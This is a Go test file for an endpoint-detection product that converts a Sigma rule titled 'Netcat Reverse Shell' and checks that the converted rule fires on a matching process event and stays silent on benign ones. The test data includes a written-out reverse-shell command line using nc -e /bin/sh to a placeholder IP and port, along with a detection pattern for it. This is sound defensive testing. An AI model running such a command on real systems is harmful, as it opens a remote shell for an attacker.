package sigma_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/argus-edr/argus/internal/detect"
	"github.com/argus-edr/argus/internal/model"
	"github.com/argus-edr/argus/internal/sigma"
)

// TestConvertedRuleLoadsAndFires proves the importer's output is valid ARGUS
// rule YAML by feeding it through the real loader and engine: a converted rule
// must compile and fire on an event it describes.
func TestConvertedRuleLoadsAndFires(t *testing.T) {
	rule, err := sigma.Convert([]byte(`
title: Netcat Reverse Shell
id: 7e2dca1a-1111-2222-3333-444455556666
level: high
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith: /nc
  command:
    CommandLine|contains:
      - -e
      - /bin/sh
  condition: selection and command
`))
	if err != nil {
		t.Fatalf("convert: %v", err)
	}

	rules := loadBundle(t, rule)
	engine := detect.NewEngine(rules, nil)

	firing := &model.Event{
		Type:    model.EventExec,
		Action:  "exec",
		Process: model.Process{Executable: "/usr/bin/nc", CommandLine: "nc -e /bin/sh 203.0.113.5 4444"},
	}
	if alerts := engine.Evaluate(firing).Alerts; len(alerts) != 1 || alerts[0].RuleID != rule.ID() {
		t.Fatalf("converted rule did not fire as expected: %+v", alerts)
	}

	// An exec missing the command-line markers must not match.
	benign := &model.Event{Type: model.EventExec, Action: "exec", Process: model.Process{Executable: "/usr/bin/nc", CommandLine: "nc -l 8080"}}
	if alerts := engine.Evaluate(benign).Alerts; len(alerts) != 0 {
		t.Fatalf("rule fired on a benign event: %+v", alerts)
	}

	// A non-exec event of the same shape must not match (the action guard holds).
	otherType := &model.Event{Type: model.EventConnect, Action: "connect", Process: model.Process{Executable: "/usr/bin/nc", CommandLine: "nc -e /bin/sh"}}
	if alerts := engine.Evaluate(otherType).Alerts; len(alerts) != 0 {
		t.Fatalf("rule fired on a non-exec event: %+v", alerts)
	}
}

// loadBundle marshals rules to a temp file and loads them with the production
// loader, so the test exercises the same path the agent uses.
func loadBundle(t *testing.T, rules ...*sigma.Rule) []*detect.Rule {
	t.Helper()
	bundle, err := sigma.MarshalRules(rules)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "sigma.yaml"), bundle, 0o644); err != nil {
		t.Fatalf("write bundle: %v", err)
	}
	loaded, err := detect.LoadDir(dir)
	if err != nil {
		t.Fatalf("load converted rules: %v\n%s", err, bundle)
	}
	return loaded
}
